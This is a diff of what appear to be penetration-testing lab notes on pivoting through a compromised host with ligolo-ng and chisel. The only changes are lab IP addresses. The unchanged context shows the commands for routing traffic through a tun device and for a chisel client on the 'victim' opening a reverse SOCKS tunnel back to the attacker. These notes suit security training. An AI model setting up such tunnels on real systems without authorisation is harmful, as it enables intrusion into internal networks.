@@ -15,7 +15,7 @@ Lets define some variables for the example:
 - Setup in attack machine:
 	# sudo ip tuntap add user $USER mode tun ligolo
 	# sudo ip link set ligolo up
-	# sudo ip route add 10.10.126.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
+	# sudo ip route add 10.10.76.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
 	# ./proxy -selfcert (Note the port from the output: Listening on 0.0.0.0:11601)
 
 - Launch agent in victim machine:
@@ -29,7 +29,7 @@ Lets define some variables for the example:
 		If error "bind: permission denied" appear we need to specify another unused port greather than 1000
 
 - To clear everything once we have finished
-	# sudo ip route del 10.10.126.0/24 dev ligolo
+	# sudo ip route del 10.10.76.0/24 dev ligolo
 	# sudo ip link del ligolo
 ```
 
@@ -47,7 +47,7 @@ It is useful when we want to access to the host & multiple ports that cannot be 
 chisel server -p 9999 --reverse
 
 # In remote machine (victim)
-chisel client 192.168.45.165:9999 R:9000:socks
+chisel client 192.168.49.124:9999 R:9000:socks
 
 ```
 
